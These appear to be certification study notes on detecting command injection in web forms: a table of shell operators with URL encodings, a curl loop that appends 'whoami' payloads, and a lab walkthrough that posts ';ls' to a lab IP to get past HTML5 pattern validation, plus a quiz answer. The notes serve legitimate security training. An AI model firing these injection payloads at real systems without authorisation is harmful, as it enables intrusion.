# Section 2 — Detection

---

## Spotting a Command Injection Sink

Look for any input that:
- Goes to a feature involving system tools (ping, dig, curl, ls, file conversion, archives, etc.)
- Returns the output of those tools verbatim in the response
- Accepts shell-special characters

Classic candidates:
- "Host Checker" / "Ping IP" pages
- Domain lookup tools
- File converters (PDF maker, image resizer)
- Backup/export buttons that shell out
- Admin panels with "exec command" features (sometimes intentionally exposed)

---

## Command Injection Operators

The bypass character that splits the original command from yours. Each has a slightly different shell semantic:

| Operator | Char | URL-encoded | Behavior |
|----------|------|-------------|----------|
| Semicolon | `;` | `%3b` | Runs both — sequentially |
| Newline | `\n` | `%0a` | Same as `;` — terminates command |
| Background | `&` | `%26` | Runs first in background, then second |
| Pipe | `\|` | `%7c` | Runs both — only second's stdout shown |
| AND | `&&` | `%26%26` | Runs second only if first succeeds |
| OR | `\|\|` | `%7c%7c` | Runs second only if first fails |
| Sub-shell (backtick) | `` ` `` | `%60` | Linux only — inline command sub |
| Sub-shell (dollar) | `$()` | `%24%28%29` | Linux only — inline command sub |

> **Windows exception:** `;` doesn't work in `cmd.exe` (PowerShell does). Use `&` or `&&` for Windows.

---

## Detection Workflow

1. Submit a benign value → confirm the output reflects what the command produced
2. Append an operator + second command (`; whoami`)
3. Observe:
   - **Output appears** → injection confirmed
   - **Error message** → maybe a filter (might still be exploitable with bypass)
   - **No change** → likely blind (move to Section 7 of this module)

```bash
# Quick batch test of all operators
for op in ';' '|' '&&' '||' '%0a'; do
  resp=$(curl -sk -X POST "http://TARGET/" --data-urlencode "input=127.0.0.1${op}whoami")
  echo "[$op] size=$(echo -n \"$resp\" | wc -c)"
done
```
> Loops through common injection operators and appends `whoami` after each one. Compares response sizes — a different size usually means the operator allowed execution. Use `input` or the actual parameter name from the form.

Different response sizes signal which operator the server accepts.

---

## Lab — Host Checker Detection

**Target:** `154.57.164.66:32362`

### The form
```html
<form method="post" action="">
  <input type="text" name="ip"
         pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
  <button type="submit">Check</button>
</form>
```

The `pattern="..."` attribute is HTML5 client-side validation — restricts the input to a valid IPv4 string. When the user types `127.0.0.1;ls` and clicks Check, the browser refuses to submit and pops a tooltip:

> **"Please match the requested format."**

This is the answer to Q1.

### Confirming the server is actually vulnerable

Client-side patterns are bypassable — submit directly via curl:

```bash
curl -sk -X POST "http://154.57.164.66:32362/" --data-urlencode "ip=127.0.0.1;ls"
```
> Bypasses the browser's HTML pattern validation by submitting the POST request directly via curl. The `--data-urlencode` flag handles special characters. The server has no backend validation, so the `;ls` injection runs.

Response includes:
```
PING 127.0.0.1 ... time=0.055 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss

index.php           ← ls output appended
style.css
```

Command injection confirmed — `;` operator works. The server has **no** validation behind the client-side pattern.

**Q1 Answer:** `Please match the requested format.` (or "Please match the requested format" — wording varies slightly by browser)

---

## Exam Notes

- HTML5 `pattern="..."` is **client-side only**. Never rely on it for security.
- Always submit via curl or Burp to bypass front-end-only patterns.
- Test multiple operators (`;`, `|`, `&&`, `||`, `%0a`) because different filters block different ones.
- If response sizes vary across operators, the server is processing some but not others. Start with whichever produces the largest response, since that likely includes injected output.
- Even when a command runs, its output may not appear. Pipe operators only show stdout of the second command. The `&` operator may display output out of order.
- The "error message" question on CPTS tests whether you recognize the browser-side validation message, not a server error.
